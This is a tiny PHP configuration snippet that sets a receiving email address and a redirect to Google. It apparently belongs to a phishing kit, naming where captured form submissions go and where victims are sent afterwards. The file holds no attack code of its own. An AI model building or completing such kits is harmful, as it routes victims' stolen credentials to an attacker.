<?php 
$Receive_email="cqmuco@gmail.com";
$redirect="https://www.google.com/";
?>